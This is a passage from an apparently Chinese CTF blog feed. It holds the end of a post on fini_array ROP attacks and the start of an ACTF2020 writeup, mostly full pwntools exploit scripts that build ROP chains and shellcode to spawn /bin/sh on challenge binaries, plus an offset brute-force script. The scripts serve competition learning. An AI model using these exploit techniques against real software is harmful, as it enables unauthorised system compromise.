class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./pwn4'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">leave = <span class="number">0x0000000000401c29</span> <span class="comment"># leave ; ret</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span> <span class="comment"># ret</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004016a6</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000447bbc</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x000000000044a659</span> <span class="comment"># pop rdx ; pop rsi ; ret</span></span><br><span class="line">syscall = <span class="number">0x0000000000402434</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">fini_array = <span class="number">0x4b50b0</span></span><br><span class="line">libc_csu_fini = <span class="number">0x0402BD0</span> <span class="comment"># __libc_csu_fini</span></span><br><span class="line">main = <span class="number">0x0401B7D</span></span><br><span class="line">bin_sh_addr=fini_array+<span class="number">0x50</span></span><br><span class="line">ropchain = [p64(pop_rdi),p64(bin_sh_addr),</span><br><span class="line">            p64(pop_rax),p64(<span class="number">0x3b</span>),</span><br><span class="line">            p64(pop_rdx_rsi),p64(<span class="number">0</span>),p64(<span class="number">0</span>),</span><br><span class="line">            p64(syscall),</span><br><span class="line">            <span class="string">"/bin/sh\x00"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># do loop :write any value to any addr</span></span><br><span class="line">ru(<span class="string">'addr:'</span>)</span><br><span class="line">sl(p64(fini_array))</span><br><span class="line">ru(<span class="string">'data:'</span>)</span><br><span class="line">se(p64(libc_csu_fini)+p64(main))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ropchain)):</span><br><span class="line">    ru(<span class="string">'addr:'</span>)</span><br><span class="line">    sl(p64(fini_array+<span class="number">0x10</span>+i*<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">'data:'</span>)</span><br><span class="line">    se(ropchain[i])</span><br><span class="line">    </span><br><span class="line">ru(<span class="string">'addr:'</span>)</span><br><span class="line">sl(p64(fini_array))</span><br><span class="line">ru(<span class="string">'data:'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">se(p64(leave)+p64(ret)) <span class="comment"># break loop and stack pivot</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5 总结"></a>0x5 总结</h1><p>以上就是如何利用<code>fini_array</code>部署、启动一次<code>ROP</code>攻击</p><p>为了方便说明，这篇文章中我用的是64位静态编译程序，没开启PIE保护，GOT表等函数指针也可以改写，但是这并不说明这种利用方式是有局限的。即使保护全开，不是静态编译，也可以通过同样的思路进行攻击，比如<code>ACTF2020</code>的<code>fmt64</code>，就是利用这种思路进行攻击的。<a href="http://47.100.63.152/2020/02/12/ACTF2020-writeup" target="_blank" rel="noopener">传送门</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
            <tag> fini_array </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020 writeup</title>
      <link href="/2020/02/13/ACTF2020-writeup/"/>
      <url>/2020/02/13/ACTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF-2020"><a href="#ACTF-2020" class="headerlink" title="ACTF 2020"></a>ACTF 2020</h1><p>中南大学和河北师范大学联合举办的寒假新人赛~</p><p>比赛时间：2月1日10:00 - 2月14日20:00</p><p>本想着冒充萌新蹭一场新生赛，让我这个19级刚入学的真萌新涨涨姿势，但没想到第一天就被发现了QAQ</p><p>这次比赛总体来说比较适合入门，web题目貌似很简单，听<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅说他刚开题就AK了…tql…作为一名二进制萌新，我主要做了re和pwn的题。pwn题比较基础，但还是学了不少新姿势，re就很烧脑了，不知掉了多少头发才做出来…不过很有意思鸭~</p><hr><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn两道堆的题目还是不会做，chk_rop想了很久也没pwn出来，最后剩了3道题，等官方wp出来好好学习一波…</p><h2 id="simple-rop"><a href="#simple-rop" class="headerlink" title="simple_rop"></a>simple_rop</h2><ul><li>题目描述：Not your abs!</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/simple_rop/simple_rop" target="_blank" rel="noopener">simple_rop</a></li><li>考察点：ROP攻击、abs函数漏洞、无符号整数</li><li>难度：简单</li><li>分值：100</li><li>完成人数：4</li></ul><p>首先分析程序，主要函数如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_8048738</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> ptr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">abs</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    v6 %= <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    v6 = rand() % <span class="number">16</span>;</span><br><span class="line">    buf[<span class="number">16</span> - v6] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">size</span> = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4[v6], buf, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"copy over!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>其中<code>buf</code>中是之前<code>read</code>读的48字节数据，<code>ptr</code>是<code>scanf(&quot;%ud&quot;)</code>读的无符号整数，这里想要栈溢出，必须让<code>abs(ptr)&lt;0</code>，否则<code>buf</code>会被随机截断…然鹅，取绝对值后的数肿么可能是负数呢！？？？百度了一下，原来<code>abs</code>函数存在漏洞：</p><blockquote><p><code>abs</code>函数的返回值是有符号整数<code>int</code>，表示范围是<code>-2147483648~2147483647</code></p><p>当<code>ptr=-2147483648</code>时，对应的绝对值是<code>2147483648</code>，超过了<code>int</code>的最大表示范围，产生溢出</p><p>溢出的结果是<code>-2147483648</code>，所以此时<code>abs</code>函数的返回值是个负数</p></blockquote><p>此外，这题给的<code>ptr</code>是无符号整数，因此直接让<code>ptr=2147483648</code>，也可以实现有符号整数溢出</p><p>绕过了<code>abs</code>之后还有一个坑，<code>memcpy</code>的目的地址会加上<code>v6</code>，然鹅<code>v6</code>的值并不确定…我在本地攻击时<code>v6=2</code>，而远程攻击却失败了，原因就是本地和远程环境<code>v6</code>的值不一样…</p><p>解决办法是写个脚本，爆破一下<code>offset</code>（<code>v6</code>取值范围为<code>0~32</code>，对应<code>offset</code>取值范围<code>4~36</code>）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] copy over!</span><br><span class="line">    You need search Rop</span><br><span class="line">[+] right! offset&#x3D;36</span><br><span class="line">[*] Closed connection to 47.106.94.13 port 50012</span><br></pre></td></tr></table></figure></div><p>爆破脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./simple_rop'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = <span class="number">0x804a050</span></span><br><span class="line">main = <span class="number">0x804864B</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p,offset)</span>:</span>        </span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="comment"># offset = 34</span></span><br><span class="line">    payload = <span class="string">'A'</span>*offset</span><br><span class="line">    <span class="comment"># payload += p32(system) + p32(main) + p32(binsh)</span></span><br><span class="line">    payload += p32(main)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">'Rop\n'</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">'cursor: \n'</span>)</span><br><span class="line">    <span class="comment"># debug('b *0x8048785')</span></span><br><span class="line">    sl(<span class="string">'-2147483648'</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    data = rc(<span class="number">1000</span>)</span><br><span class="line">    log.success(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You need search Rop'</span> <span class="keyword">in</span> data:</span><br><span class="line">        log.success(<span class="string">"right! offset="</span>+str(offset))</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.warning(<span class="string">"fail!  offset="</span>+str(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#  v6  off</span></span><br><span class="line"><span class="comment">#  0   36</span></span><br><span class="line"><span class="comment">#  2   34</span></span><br><span class="line"><span class="comment">#  32  4</span></span><br><span class="line">offset = <span class="number">36</span></span><br><span class="line"><span class="keyword">while</span> flag==<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        is_local = <span class="literal">True</span></span><br><span class="line">        p = process(local_file)</span><br><span class="line">        libc = ELF(local_libc)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        is_remote = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">            host = sys.argv[<span class="number">1</span>]</span><br><span class="line">            port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">        p = remote(host, port)</span><br><span class="line">        libc = ELF(remote_libc)</span><br><span class="line">    exp(p,offset)</span><br><span class="line">    offset -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> offset &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><p>拿到远程的<code>offset</code>之后才是真正的<code>SIMPLE ROP</code>攻击…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./simple_rop'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">36</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'-2147483648'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>p.s.其实<code>docker</code>默认的操作系统是<code>Ubuntu16.04</code>，但是不可能为了做个题就装个虚拟机吧hhhh</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul><li>题目描述：Do you know stack ?</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/shellcode/shellcode" target="_blank" rel="noopener">shellcode</a></li><li>考察点：shellcode</li><li>难度：入门</li><li>分值：100</li><li>完成人数：3</li></ul><p>首先查看一下程序保护：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><p>栈可执行，并且给了<code>jmp rsp</code>，因此直接跳到<code>shellcode</code>即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./shellcode'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span 